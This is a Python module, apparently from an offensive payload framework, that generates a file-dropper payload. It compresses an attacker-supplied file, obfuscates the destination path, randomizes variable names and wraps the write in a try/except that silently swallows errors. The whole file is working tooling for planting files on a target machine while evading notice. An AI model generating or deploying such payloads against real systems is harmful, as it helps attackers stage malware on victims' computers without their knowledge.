import zlib
from payloads.helpers.string import random_string
from payloads.modules.python.common import obfuscate_python_string


class Module:

    def __init__(self, params=[]):
        self.info = {
            'Author': 'Alain Homewood',
            'Description': 'Drops an inline stored file to disk',
            'SupportsInput': True
        }

        self.options = {
            'File': {
                'Description': 'The file to drop',
                'Required': True,
                'Type': 'file',
                'Value': ''
            },
            'Destination': {
                'Description': 'The destination to drop the file to',
                'Required': True,
                'Value': ''
            },
        }
        for param in params:
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):
        var_file = random_string(10, 20)
        compressed_data = zlib.compress(self.options['File']['Value'])

        code = "import os;import zlib;"
        code += "{0}=open(os.path.expanduser({1}),'wb');".format(var_file,
                                                                 obfuscate_python_string(self.options['Destination']['Value']))
        code += "{0}.write(zlib.decompress({1}));".format(var_file, compressed_data)
        code += "{0}.close();".format(var_file)
        code = "try:\n    {0}\nexcept:\n    pass\n".format(code)

        return code
